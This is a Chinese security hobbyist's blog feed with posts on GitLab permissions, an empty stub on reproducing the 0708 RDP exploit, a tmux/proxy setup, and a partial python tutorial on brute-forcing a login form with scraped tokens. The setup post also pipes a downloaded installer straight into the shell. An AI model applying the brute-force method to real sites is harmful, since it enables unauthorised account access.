href="https://blog.csdn.net/Adelly/article/details/79099772" target="_blank" rel="noopener">参考链接</a></p><ol><li>首先需要了解的知识点：</li></ol><h2 id="3-1-用户与组：涉及到权限控制"><a href="#3-1-用户与组：涉及到权限控制" class="headerlink" title="3.1 用户与组：涉及到权限控制"></a>3.1 用户与组：涉及到权限控制</h2><hr><p>Guest(匿名用户) - 创建项目、写留言薄</p><p>Reporter（报告人）- 创建项目、写留言薄、 <strong>拉项目、下载项目、创建代码片段</strong></p><p>Developer（开发者）- 创建项目、写留言薄、拉项目、下载项目、创建代码片段、<strong>创建合并请求、创建新分支、推送不受保护的分支、移除不受保护的分支 、创建标签、编写wiki</strong></p><p>Master（管理者）- 创建项目、写留言薄、拉项目、下载项目、创建代码片段、创建合并请求、创建新分支、推送不受保护的分支、移除不受保护的分支 、创建标签、编写wiki、<strong>增加团队成员、推送受保护的分支、移除受保护的分支、编辑项目、添加部署密钥、配置项目钩子</strong></p><p>Owner（所有者）- 创建项目、写留言薄、拉项目、下载项目、创建代码片段、创建合并请求、创建新分支、推送不受保护的分支、移除不受保护的分支 、创建标签、编写wiki、增加团队成员、推送受保护的分支、移除受保护的分支、编辑项目、添加部署密钥、配置项目钩子、<strong>开关公有模式、将项目转移到另一个名称空间、删除项目</strong></p><hr><h1 id="04-git-常用命令"><a href="#04-git-常用命令" class="headerlink" title="04 git 常用命令"></a>04 git 常用命令</h1><h2 id="4-1-账号类"><a href="#4-1-账号类" class="headerlink" title="4.1 账号类"></a>4.1 账号类</h2><p>git config –system –unset credential.helper   #删除所有已添加的账号</p><p>git config –global credential.helper store  #命令实现保存用户名和密码不用再输入</p><p>git config user.name ‘github用户名’ #添加用户</p><p>git config user.email ‘邮箱’</p><h2 id="4-2-pull-request的git命令"><a href="#4-2-pull-request的git命令" class="headerlink" title="4.2 pull request的git命令"></a>4.2 pull request的git命令</h2><p>如何将自己的分支推送到master分支？</p><p>—-敲里嘛，搞了一晚上没搞定，不弄了，反正只能web端进行发起merge request—</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;近日接到新任务：搭建本地git&lt;/p&gt;
&lt;p&gt;使用到gitlab、docker安装。难度略大&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="https://zzdkl.com.cn/categories/git/"/>
    
      <category term="gitlab" scheme="https://zzdkl.com.cn/categories/git/gitlab/"/>
    
    
      <category term="git" scheme="https://zzdkl.com.cn/tags/git/"/>
    
      <category term="gitlab" scheme="https://zzdkl.com.cn/tags/gitlab/"/>
    
  </entry>
  
  <entry>
    <title>0708复现</title>
    <link href="https://zzdkl.com.cn/2019/09/09/0708_recurrence/"/>
    <id>https://zzdkl.com.cn/2019/09/09/0708_recurrence/</id>
    <published>2019-09-09T00:50:10.069Z</published>
    <updated>2019-09-08T10:26:01.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>0708复现, 冲!</p><a id="more"></a><h1 id="01-环境"><a href="#01-环境" class="headerlink" title="01 环境"></a>01 环境</h1><p>Kali - MSF<br>Win7</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;0708复现, 冲!&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Windows/"/>
    
      <category term="EXP" scheme="https://zzdkl.com.cn/categories/Windows/EXP/"/>
    
    
      <category term="0708" scheme="https://zzdkl.com.cn/tags/0708/"/>
    
  </entry>
  
  <entry>
    <title>AppScan报告处理脚本</title>
    <link href="https://zzdkl.com.cn/2019/09/09/AppScan/"/>
    <id>https://zzdkl.com.cn/2019/09/09/AppScan/</id>
    <published>2019-09-09T00:50:03.175Z</published>
    <updated>2019-09-07T03:33:35.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>最近独立开发了AppScan报告处理脚本, 将实现以下功能:  </p><ol><li>自动化处理扫描结果</li><li>自动化处理扫描任务</li></ol><a id="more"></a><h1 id="01-后续改进计划"><a href="#01-后续改进计划" class="headerlink" title="01 后续改进计划"></a>01 后续改进计划</h1><p>目前脚本还是比较粗糙, 仅完成了基本操作<br>后续改进计划有:  </p><ol><li>批量处理结果(难易程度: 3)  </li><li>批量进行扫描(难易程度: 2)  </li><li>批量进行扫描并自动进行结果处理(难易程度: 7)</li><li>去除数据库依赖, 仅使用HTML文档内容(难易程度: 6)</li></ol><h1 id="02-任务安排"><a href="#02-任务安排" class="headerlink" title="02 任务安排"></a>02 任务安排</h1><p>按照计划顺序进行, 预计前3计划能在9月底完成</p><p>待更新…</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;最近独立开发了AppScan报告处理脚本, 将实现以下功能:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自动化处理扫描结果&lt;/li&gt;
&lt;li&gt;自动化处理扫描任务&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Sec" scheme="https://zzdkl.com.cn/categories/Sec/"/>
    
      <category term="AppScan" scheme="https://zzdkl.com.cn/categories/Sec/AppScan/"/>
    
      <category term="Python" scheme="https://zzdkl.com.cn/categories/Python/"/>
    
      <category term="AppScan" scheme="https://zzdkl.com.cn/categories/Python/AppScan/"/>
    
    
      <category term="AppScan" scheme="https://zzdkl.com.cn/tags/AppScan/"/>
    
  </entry>
  
  <entry>
    <title>tmux+fish调优终端</title>
    <link href="https://zzdkl.com.cn/2019/09/02/tmux_and_fish/"/>
    <id>https://zzdkl.com.cn/2019/09/02/tmux_and_fish/</id>
    <published>2019-09-02T00:27:15.065Z</published>
    <updated>2019-09-01T02:02:47.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>最近老是需要重新配置环境, 所以把tmux + fish + 代理的所有配置一起贴出来, 以前的文章就懒得再删除整理了. </p><a id="more"></a><h1 id="01-tmux安装"><a href="#01-tmux安装" class="headerlink" title="01 tmux安装"></a>01 tmux安装</h1><p>可以使用<code>aptitude show tmux</code> 或者 <code>tmux -V</code>查看tmux 的版本<br><strong>版本需要大于2.1</strong><br><a href="https://www.wandouip.com/t5i64690/" target="_blank" rel="noopener">CnetOS最新版</a><br><a href="https://bogdanvlviv.com/posts/tmux/how-to-install-the-latest-tmux-on-ubuntu-16_04.html" target="_blank" rel="noopener">Ubuntu最新版</a>  </p><h1 id="02-tmux设置"><a href="#02-tmux设置" class="headerlink" title="02 tmux设置"></a>02 tmux设置</h1><p>首先设置PS1</p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=' <span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[37m<span class="symbol">\]</span>[<span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\0</span>33[1;36m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\e</span>[1;32m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\e</span>[1;33m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\e</span>[35m<span class="symbol">\]</span><span class="symbol">\H</span><span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span> <span class="symbol">\[</span><span class="symbol">\e</span>[4;37m<span class="symbol">\]</span>`pwd`<span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\0</span>33[37m<span class="symbol">\]</span>]<span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span><span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\e</span>[36m<span class="symbol">\]</span><span class="symbol">\$</span> =&gt; <span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span> '</span><br></pre></td></tr></tbody></table></figure><p>可以使用以下方法</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">git clone https:<span class="comment">//github.com/****/.tmux.git</span></span><br><span class="line">ln -s -f .tmux/<span class="selector-class">.tmux</span><span class="selector-class">.conf</span></span><br><span class="line">cp .tmux/<span class="selector-class">.tmux</span><span class="selector-class">.conf</span><span class="selector-class">.local</span> .</span><br></pre></td></tr></tbody></table></figure><p>优化  <code>vim .tmux.conf</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> | splitw -h -c <span class="string">'#{pane_current_path}'</span> <span class="comment"># 水平方向新增面板，默认进入当前目录</span></span><br></pre></td></tr></tbody></table></figure><p>或者自定义:</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use something easier to type as the prefix.</span></span><br><span class="line"><span class="keyword">set</span> -g prefix C-a</span><br><span class="line">unbind C-b</span><br><span class="line">bind C-a send-prefix</span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口计数从1开始，方便切换</span></span><br><span class="line"><span class="keyword">set</span> -g base-<span class="keyword">index</span> <span class="number">1</span></span><br><span class="line">setw -g pane-base-<span class="keyword">index</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用和关闭status bar</span></span><br><span class="line">bind S <span class="keyword">set</span> <span class="keyword">status</span> <span class="keyword">on</span></span><br><span class="line">bind D <span class="keyword">set</span> <span class="keyword">status</span> <span class="keyword">off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 消息背景色</span></span><br><span class="line"><span class="comment"># set -g message-bg white</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">mode</span>-<span class="keyword">keys</span> vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭自动重命名窗口</span></span><br><span class="line">setw -g <span class="keyword">allow</span>-<span class="keyword">rename</span> <span class="keyword">off</span></span><br><span class="line">setw -g <span class="keyword">automatic</span>-<span class="keyword">rename</span> <span class="keyword">off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bind a reload key</span></span><br><span class="line">bind r <span class="keyword">source</span>-<span class="keyword">file</span> ~/.tmux.conf \; display-message "Config reloaded..."</span><br><span class="line"></span><br><span class="line"><span class="comment"># I personally rebind the keys so "|" splits the current window vertically, and "-" splits it horizontally. Not the easiest things to type, though easy to remember.</span></span><br><span class="line">bind | split-window -h</span><br><span class="line">bind _ split-window -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># fixes the delay problem</span></span><br><span class="line"><span class="keyword">set</span> -sg escape-<span class="built_in">time</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 面板切换</span></span><br><span class="line">bind-<span class="keyword">key</span> k <span class="keyword">select</span>-pane -U</span><br><span class="line">bind-<span class="keyword">key</span> j <span class="keyword">select</span>-pane -D</span><br><span class="line">bind-<span class="keyword">key</span> h <span class="keyword">select</span>-pane -L</span><br><span class="line">bind-<span class="keyword">key</span> l <span class="keyword">select</span>-pane -R</span><br><span class="line"></span><br><span class="line"><span class="comment"># 面板大小调整</span></span><br><span class="line">bind -r ^k resizep -U <span class="number">10</span></span><br><span class="line">bind -r ^j resizep -D <span class="number">10</span></span><br><span class="line">bind -r ^h resizep -L <span class="number">10</span></span><br><span class="line">bind -r ^l resizep -R <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 状态栏</span></span><br><span class="line"><span class="comment"># 颜色</span></span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">status</span>-bg black</span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">status</span>-fg white</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对齐方式</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g <span class="keyword">status</span>-justify centre</span><br><span class="line"></span><br><span class="line"><span class="comment"># 左下角</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g <span class="keyword">status</span>-<span class="keyword">left</span> <span class="string">'#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]'</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g <span class="keyword">status</span>-<span class="keyword">left</span>-<span class="keyword">length</span> <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口列表</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">window</span>-<span class="keyword">option</span> -g <span class="keyword">window</span>-<span class="keyword">status</span>-<span class="keyword">format</span> <span class="string">'#[dim]#I:#[default]#W#[fg=grey,dim]'</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">window</span>-<span class="keyword">option</span> -g <span class="keyword">window</span>-<span class="keyword">status</span>-<span class="keyword">current</span>-<span class="keyword">format</span> <span class="string">'#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 右下角</span></span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">status</span>-<span class="keyword">right</span> <span class="string">'#[fg=green][#[fg=cyan]%H:%M#[fg=green]]'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启鼠标</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g mouse <span class="keyword">on</span></span><br></pre></td></tr></tbody></table></figure><p>重启tmux即可</p><h1 id="03-fish安装"><a href="#03-fish安装" class="headerlink" title="03 fish安装"></a>03 fish安装</h1><p>fish安装过分辣鸡, 弃用</p><pre><code>1. 安装fish，安装oh-my-fish  [参考链接](&lt;https://linux.cn/article-9515-1.html&gt;)  [fish最新版安装参考网页](&lt;http://fishshell.com/#platform_tabs&gt;)    <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-add-repository ppa:fish-shell/release-3</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install fish</span><br><span class="line"></span><br><span class="line">curl -L github.com/oh-my-fish/oh-my-fish/raw/master/bin/install | fish</span><br></pre></td></tr></tbody></table></figure>2. 安装主题：theme-bobthefish [主题参考链接](&lt;https://www.helplib.com/GitHub/article_124955&gt;)    `omf install bobthefish`3. 进行一些设置    <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set -U theme_nerd_fonts yes</span><br><span class="line">set -U theme_color_scheme terminal-dark-white</span><br><span class="line"># Ubuntu 选择 set -U theme_color_scheme zenburn  </span><br><span class="line">set -U fish_prompt_pwd_dir_length 0</span><br></pre></td></tr></tbody></table></figure></code></pre><h1 id="04-proxychians-设置"><a href="#04-proxychians-设置" class="headerlink" title="04 proxychians 设置"></a>04 proxychians 设置</h1><p>vim /etc/proxychains.conf</p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks5  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10808</span></span><br><span class="line">http    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10888</span></span><br></pre></td></tr></tbody></table></figure><h1 id="加入代理"><a href="#加入代理" class="headerlink" title="加入代理"></a>加入代理</h1><p>vim .bashrc</p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">complete -c proxychains</span><br><span class="line"></span><br><span class="line">alias setproxysocks5='export ALL_PROXY=socks5h://127.0.0.1:10808'</span><br><span class="line">alias unsetproxy='unset ALL_PROXY'</span><br><span class="line">alias setproxyhttp='export ALL_PROXY=http://127.0.0.1:10888'    ##v2ray和curl会有socks5的冲突,从网上找到的参考链接里可以发现，我们加上socks5h就可以了</span><br><span class="line"></span><br><span class="line">PS1=' <span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[37m<span class="symbol">\]</span>[<span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\0</span>33[1;36m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\e</span>[1;32m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\e</span>[1;33m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\e</span>[35m<span class="symbol">\]</span><span class="symbol">\H</span><span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span> <span class="symbol">\[</span><span class="symbol">\e</span>[4;37m<span class="symbol">\]</span>`pwd`<span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\0</span>33[37m<span class="symbol">\]</span>]<span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span><span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\e</span>[36m<span class="symbol">\]</span><span class="symbol">\$</span> =&gt; <span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span> '</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">source .bashrc</span><br></pre></td></tr></tbody></table></figure><h1 id="官方源"><a href="#官方源" class="headerlink" title="官方源"></a>官方源</h1><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#官方源</span></span><br><span class="line">deb <span class="keyword">http</span>://<span class="keyword">http</span>.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src <span class="keyword">http</span>://<span class="keyword">http</span>.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;最近老是需要重新配置环境, 所以把tmux + fish + 代理的所有配置一起贴出来, 以前的文章就懒得再删除整理了. &lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="Shell" scheme="https://zzdkl.com.cn/categories/Linux/Shell/"/>
    
    
      <category term="Linux" scheme="https://zzdkl.com.cn/tags/Linux/"/>
    
      <category term="tmux" scheme="https://zzdkl.com.cn/tags/tmux/"/>
    
      <category term="fish" scheme="https://zzdkl.com.cn/tags/fish/"/>
    
  </entry>
  
  <entry>
    <title>测试用</title>
    <link href="https://zzdkl.com.cn/2019/08/30/test/"/>
    <id>https://zzdkl.com.cn/2019/08/30/test/</id>
    <published>2019-08-30T02:15:43.361Z</published>
    <updated>2019-08-30T02:16:23.211Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>test</p><a id="more"></a><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;test&lt;/p&gt;
    
    </summary>
    
      <category term="Others" scheme="https://zzdkl.com.cn/categories/Others/"/>
    
    
  </entry>
  
  <entry>
    <title>MarkDown跳转</title>
    <link href="https://zzdkl.com.cn/2019/08/29/markdown_grammar/"/>
    <id>https://zzdkl.com.cn/2019/08/29/markdown_grammar/</id>
    <published>2019-08-29T02:24:09.227Z</published>
    <updated>2019-08-29T02:24:48.512Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>记录MarkDown遇到的用法</p><a id="more"></a><h2 id="01-页内跳转"><a href="#01-页内跳转" class="headerlink" title="01_页内跳转"></a>01_页内跳转</h2><ol><li><p>首先先定义一个anchor</p><blockquote><p><code>&lt;span id="jump_anchor"&gt;这里是注释，位于跳转之后的地方&lt;/span&gt;</code></p></blockquote><p> 显示结果为</p><blockquote><p><span id="jump_anchor">这里是注释，位于跳转之后的地方</span></p></blockquote></li></ol><ol start="2"><li><p>然后使用markDown语法</p><blockquote><p><code>[点击跳转](#jump_anchor)</code><br> 会跳转到显示结果这里。如果需要测试，往下翻到最后。</p></blockquote></li></ol><p><a href="#jump_anchor">点击跳转</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;记录MarkDown遇到的用法&lt;/p&gt;
    
    </summary>
    
      <category term="MarkDown" scheme="https://zzdkl.com.cn/categories/MarkDown/"/>
    
    
      <category term="MarkDown" scheme="https://zzdkl.com.cn/tags/MarkDown/"/>
    
  </entry>
  
  <entry>
    <title>python request模块进行破解</title>
    <link href="https://zzdkl.com.cn/2019/08/29/python_bruteforce_simple1/"/>
    <id>https://zzdkl.com.cn/2019/08/29/python_bruteforce_simple1/</id>
    <published>2019-08-29T02:21:46.358Z</published>
    <updated>2019-08-29T02:23:43.147Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><ol><li>今日份目标：暴力破解成功</li><li>流程：使用python进行任务</li></ol><a id="more"></a><h1 id="1-模块"><a href="#1-模块" class="headerlink" title="1. 模块"></a>1. 模块</h1><p>使用python request模块</p><h1 id="2-步骤如下"><a href="#2-步骤如下" class="headerlink" title="2.步骤如下"></a>2.步骤如下</h1><ol><li>用request模块请求url</li><li>对于返回包进行切片操作，获取其中的token值</li><li>将获取到的token值与字典一起发送进行暴力破解</li></ol><h1 id="3-步骤开始"><a href="#3-步骤开始" class="headerlink" title="3.步骤开始"></a>3.步骤开始</h1><p><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">参考网址</a></p><p><a href="https://blog.csdn.net/LOLITA0164/article/details/80176996" target="_blank" rel="noopener">参考网址1：用来request的用法</a></p><p><a href="https://blog.csdn.net/Danielntz/article/details/51861168" target="_blank" rel="noopener">参考网址2：最终实现方法</a></p><p><a href="eed1183184514fde0ef6310575f14458">参考网址3:获取token</a></p><h2 id="3-1Token获取代码如下："><a href="#3-1Token获取代码如下：" class="headerlink" title="3.1Token获取代码如下："></a>3.1Token获取代码如下：</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from distutils.filelist import findall</span><br><span class="line"></span><br><span class="line">host = "http://打码用***打码用/c/hdyzma/"</span><br><span class="line"></span><br><span class="line">page = urllib.request.urlopen(host)</span><br><span class="line">contents = page.read()</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(contents,"html.parser")</span><br><span class="line">#soup的用法</span><br><span class="line"></span><br><span 